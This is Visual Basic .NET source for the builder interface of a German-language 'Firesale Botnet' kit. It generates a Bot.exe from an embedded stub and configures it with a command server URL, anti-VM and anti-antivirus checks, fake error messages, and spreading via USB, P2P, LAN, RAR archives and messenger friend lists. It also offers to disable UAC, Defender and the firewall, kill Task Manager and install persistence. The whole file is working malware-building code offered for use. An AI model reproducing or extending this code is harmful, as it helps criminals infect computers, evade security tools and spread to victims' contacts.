﻿Imports System.IO
Imports System.Net
Imports System.Text
Imports fLaSh.Dissembler
Imports System.Runtime.InteropServices

Public Class Form1
#Region "Deklarationen"
    Dim PcUsername As String = Environment.UserName()
    Dim VB6setting As New Compatibility.VB6.FixedLengthString(1000)
    Dim RunningProcesses As Process() = Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName)
    Private Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
#End Region

#Region "Start vom Builder"
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Call FlushMemory()
        Mut.Text = GetRandomText(Chars.ToUpper & Num, 12)
        Timer1.Start()
        If (RunningProcesses.Length > 1) Then
            MessageBox.Show("Kann aus Sicherheitsgründen nur einmal gestartet werden!", "Sicherheits Fehler", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            GC.Collect()
            End
        End If
    End Sub
    Private Sub Form_Unload(ByVal Cancel As Integer)
        Application.Exit()
    End Sub
#End Region

#Region "Bot Erstellen"
    Private Sub btnFertig_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnFertig.Click
        Try
            'Dim urlhwid As String = "http://92.241.190.202/~anatoxi1/xhwid/connect.php?hwid=" & txtID.Text
            'Dim httpRequest As HttpWebRequest = HttpWebRequest.Create(urlhwid)
            'Dim httpResponse As HttpWebResponse = httpRequest.GetResponse()
            'Dim reader As StreamReader = New StreamReader(httpResponse.GetResponseStream)
            'Dim httpContent As String = reader.ReadToEnd
            'If Not httpContent = "Existiert bereits!" Then
            'MsgBox("Sie haben eine Ungültige Hardware ID!", MsgBoxStyle.Critical, "Sicherheits Fehler")
            'End
            'End If
            If txtUrl.Text = Nothing Then
                MsgBox("Sie haben den Link zur /bot.php vergessen!", MsgBoxStyle.Information, "Firesale Botnet")
                Exit Sub
            End If
            If cbMSN.Checked = True Then
                If txtSprelink.Text = Nothing Then
                    MsgBox("Sie haben den Skype Spreadlink vergessen!", MsgBoxStyle.Information, "Firesale Botnet")
                    Exit Sub
                End If
            Else
            End If
            If cbMSN.Checked = True Then
                If txtSprelink.Text = Nothing Then
                    MsgBox("Sie haben den MSN Spreadlink vergessen!", MsgBoxStyle.Information, "Firesale Botnet")
                    Exit Sub
                End If
            Else
            End If
            If cbIcq.Checked = True Then
                If txtSprelink.Text = Nothing Then
                    MsgBox("Sie haben den ICQ Spreadlink vergessen!", MsgBoxStyle.Information, "Firesale Botnet")
                    Exit Sub
                End If
            Else
            End If
            Dim url As String = txtUrl.Text
            Dim sprelink As String = txtSprelink.Text
            Dim AntiVM As Boolean = cbAntiVM.Checked
            Dim AntiVB As Boolean = cbAntiVB.Checked
            Dim AntiVP As Boolean = cbAntiVP.Checked
            Dim AntiKA As Boolean = cbAntiKA.Checked
            Dim AntiZA As Boolean = cbAntiZA.Checked
            Dim AntiNO As Boolean = cbAntiNO.Checked
            Dim AntiAA As Boolean = cbAntiAA.Checked
            Dim AntiOP As Boolean = cbAntiOP.Checked
            Dim AntiBI As Boolean = cbAntiBI.Checked
            Dim AntiSN As Boolean = cbAntiSN.Checked
            Dim Fakemessage As Boolean = cbFakeError.Checked
            Dim msgTitel As String = txttitel.Text
            Dim msgText As String = txttext.Text
            Dim msgErrorRadio As Boolean = RadioError.Checked
            Dim msgInformationRadio As Boolean = RadioInformation.Checked
            Dim msgAchtungRadio As Boolean = RadioAchtung.Checked
            Dim msgFrageRadio As Boolean = RadioFrage.Checked
            Dim P2p As Boolean = cbP2p.Checked
            Dim Usb As Boolean = cbUsb.Checked
            Dim Lan As Boolean = cbLan.Checked
            Dim Rar As Boolean = cbRar.Checked
            Dim Msn As Boolean = cbMSN.Checked
            Dim Skype As Boolean = cbSkype.Checked
            Dim ProcKiller As Boolean = cbProcess.Checked
            Dim Pkill As String = txtKill.Text
            Dim UAC As String = cbUac.Checked
            Dim DEF As String = cbDefender.Checked
            Dim Firewall As String = cbFirewall.Checked
            Dim Autostart As String = cbAutostart.Checked
            Dim Prisis As String = cbPris.Checked

            Dim SchreibeDatei As New IO.BinaryWriter(New IO.FileStream(My.Application.Info.DirectoryPath & "\Bot.exe", IO.FileMode.Create))
            SchreibeDatei.Write(My.Resources.Stub)
            SchreibeDatei.Close()

            VB6setting.Value = url _
            & "#" & AntiVM & "#" & AntiVB & "#" & AntiVP & "#" & AntiKA & "#" & AntiZA & "#" & AntiNO & "#" & AntiAA & "#" & AntiOP & "#" & AntiBI & "#" & AntiSN _
            & "#" & Fakemessage & "#" & msgTitel & "#" & msgText & "#" & msgErrorRadio & "#" & msgInformationRadio & "#" & msgAchtungRadio & "#" & msgFrageRadio _
            & "#" & P2p & "#" & Usb & "#" & ProcKiller & "#" & Pkill & "#" & UAC & "#" & Firewall & "#" & DEF & "#" & Lan & "#" & Msn & "#" & Skype & "#" & sprelink _
            & "#" & Autostart & "#" & Prisis & "#" & Rar

            addResource(My.Application.Info.DirectoryPath & "\Bot.exe", VB6setting.Value)

            If cbIcon.Checked = True Then
                If txtIcon.Text = Nothing Then
                    MsgBox("Sie haben das Icon vergessen zu wählen!", MsgBoxStyle.Information, "Firesale Botnet")
                    Exit Sub
                End If
                Dim oIconFilenathu As New IconFile(txtIcon.Text)
                Dim groupIconResource As GroupIconResource = oIconFilenathu.ConvertToGroupIconResource()
                groupIconResource.SaveTo(My.Application.Info.DirectoryPath & "\Bot.exe")
            Else
            End If
            If cbExe.Checked = True Then
                Dim Eineit As String
                ExePump()
                Eineit = "Kilobytes"
            Else
            End If
            MsgBox("Bot erfolgreich erstellt!", MsgBoxStyle.Information, "Firesale Botnet")
            Call FlushMemory()
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Ein und Ausblende"
#Region "Bypasser"
    Private Sub cbBypass_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbBypass.CheckedChanged
        If cbBypass.Checked Then
            gbBypass.Enabled = True
        ElseIf cbBypass.CheckState = CheckState.Unchecked And gbBypass.Enabled = True Then
            cbBypass.CheckState = CheckState.Unchecked
            gbBypass.Enabled = False
        End If
    End Sub
#End Region
#Region "ExE Pumper"
    Private Sub cbExe_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbExe.CheckedChanged
        If cbExe.Checked Then
            gbExepump.Enabled = True
        ElseIf cbExe.CheckState = CheckState.Unchecked And gbExepump.Enabled = True Then
            cbExe.CheckState = CheckState.Unchecked
            gbExepump.Enabled = False
        End If
    End Sub
#End Region
#Region "Anti Codes"
    Private Sub cbAntiCodes_CheckedChanged_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbAntiCodes.CheckedChanged
        If cbAntiCodes.Checked Then
            gbAntiCodes.Enabled = True
        ElseIf cbAntiCodes.CheckState = CheckState.Unchecked And gbAntiCodes.Enabled = True Then
            cbAntiCodes.CheckState = CheckState.Unchecked
            gbAntiCodes.Enabled = False
        End If
    End Sub
#End Region
#Region "Prisistent"
    Private Sub cbPris_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbPris.CheckedChanged
        If cbPris.Checked = True Then
            cbAutostart.Checked = True
            cbRoot.Checked = True
        Else
            cbRoot.Checked = False
            cbPris.Checked = False
            cbAutostart.Checked = False
        End If
    End Sub
#End Region
#Region "Icon Changer"
    Private Sub cbIcon_CheckedChanged_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbIcon.CheckedChanged
        If cbIcon.Checked Then
            gbIcon.Enabled = True
        ElseIf cbIcon.CheckState = CheckState.Unchecked And gbIcon.Enabled = True Then
            cbIcon.CheckState = CheckState.Unchecked
            gbIcon.Enabled = False
        End If
    End Sub
    Private Sub pbIcon_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles pbIcon.Click
        OpenFileDialog1.DefaultExt = "ico"
        OpenFileDialog1.Filter = "Icon (*.ico)|*.ico"
        OpenFileDialog1.FilterIndex = 1
        If OpenFileDialog1.ShowDialog(Me) = DialogResult.OK Then
            txtIcon.Text = String.Empty
            txtIcon.Text = OpenFileDialog1.FileName
        End If
        If File.Exists(txtIcon.Text) Then
            Dim nathu As New Bitmap(txtIcon.Text)
            pbIcon.Image = nathu
        End If
    End Sub
#End Region
#Region "Process Killer"
    Private Sub cbProcess_CheckedChanged_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbProcess.CheckedChanged
        If cbProcess.Checked Then
            gbProcessKiller.Enabled = True
            txtKill.Text = ("taskmgr")
        ElseIf cbProcess.CheckState = CheckState.Unchecked And gbProcessKiller.Enabled = True Then
            cbProcess.CheckState = CheckState.Unchecked
            gbProcessKiller.Enabled = False
            txtKill.Text = ("")
        End If
    End Sub
#End Region
#Region "Spread Optionen"
    Private Sub cbSpread_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbSpread.CheckedChanged
        If cbSpread.Checked Then
            gbSpread.Enabled = True
        ElseIf cbProcess.CheckState = CheckState.Unchecked And gbSpread.Enabled = True Then
            cbSpread.CheckState = CheckState.Unchecked
            gbSpread.Enabled = False
        End If
    End Sub
    Private Sub cbMSN_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbMSN.CheckedChanged
        If cbMSN.Checked = True Then
            txtSprelink.Enabled = True
            PictureBox25.Enabled = True
        Else
            txtSprelink.Enabled = False
            PictureBox25.Enabled = False
        End If
    End Sub
    Private Sub cbIcq_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbIcq.CheckedChanged
        If cbIcq.Checked = True Then
            txtSprelink.Enabled = True
            PictureBox25.Enabled = True
        Else
            txtSprelink.Enabled = False
            PictureBox25.Enabled = False
        End If
    End Sub
#Region "Skype Spreadlink"
    Private Sub cbSkype_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbSkype.CheckedChanged
        If cbSkype.Checked = True Then
            txtSprelink.Enabled = True
            PictureBox25.Enabled = True
        Else
            txtSprelink.Enabled = False
            PictureBox25.Enabled = False
        End If
    End Sub
#End Region
#End Region
#Region "Fake Error Message"
    Private Sub cbFakeError_CheckedChanged_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbFakeError.CheckedChanged
        If cbFakeError.Checked Then
            gbFakeError.Enabled = True
            RadioError.Checked = True
        ElseIf cbFakeError.CheckState = CheckState.Unchecked And gbFakeError.Enabled = True Then
            cbFakeError.CheckState = CheckState.Unchecked
            gbFakeError.Enabled = False
            RadioError.Checked = False
        End If
    End Sub
#End Region
#End Region

#Region "Funktionen"
    Sub ExePump()
        Dim nud2 As String
        nud2 = NumericUpDown1.Value * 1024
        Dim Buffer As Byte() = New Byte((nud2 + 1) - 1) {}
        Dim Filestream As New FileStream(My.Application.Info.DirectoryPath & "\Bot.exe", FileMode.Append)
        Try
            Filestream.Seek(0, SeekOrigin.End)
            Dim num2 As Integer = (Buffer.Length - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                Filestream.WriteByte(Buffer(i))
                i += 1
            Loop
        Finally
            Filestream.Close()
        End Try
    End Sub
    Public Shared Sub FlushMemory()
        GC.Collect()
        GC.WaitForPendingFinalizers()
        If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then
            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        End If
    End Sub
    Private Sub btnMu_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnMu.Click
        Mut.Text = GetRandomText(Chars.ToUpper & Num, 12)
    End Sub
    Dim Chars As String = "abcdefghijklmnopqrstuvwxyz"
    Dim Num As String = 1234567890
    Public Function GetRandomText(ByVal Chars As String, ByVal Length As Integer) As String
        Dim R As New Random
        Dim TextOutput As String = Nothing
        Dim S As New StringBuilder(Chars)
        For i = 0 To Length - 1
            TextOutput = TextOutput & S.Chars(R.Next(0, S.Length))
        Next
        Return TextOutput
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        txtKey.Text = (GenKey())
    End Sub
    Public Function GenKey()
        Dim Key As String = Nothing
        Dim Random As New Random
        For I = 0 To 1000
            Key += Random.Next(10, 99) & " "
        Next
        Return Key
    End Function
#End Region

#Region "Hilfestellungen"
    Private Sub Label10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label10.Click
        Process.Start("http://Anatoxis.6x.to/")
    End Sub
    Private Sub PictureBox11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox11.Click
        txtUrl.Text = ("http://deinserver.net")
        MsgBox("Link zur bot.php -> Sehr wichtig!!!", MsgBoxStyle.Information, "Firesale Botnet")
    End Sub
    Private Sub PictureBox25_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox25.Click
        txtSprelink.Text = "http://deinserver.net/update.exe"
        MsgBox("Beim ICQ, MSN oder Skype Spread wird ein Link mit einem Faketext an alle User" & vbNewLine & "die in der Freundesliste stehen gesendet." & vbNewLine & "Sie müssen deshalb vorher die Bot.exe auf einen Webspace laden und den Downloadlink eintragen!", MsgBoxStyle.Information, "Firesale Botnet")
    End Sub
#End Region
End Class
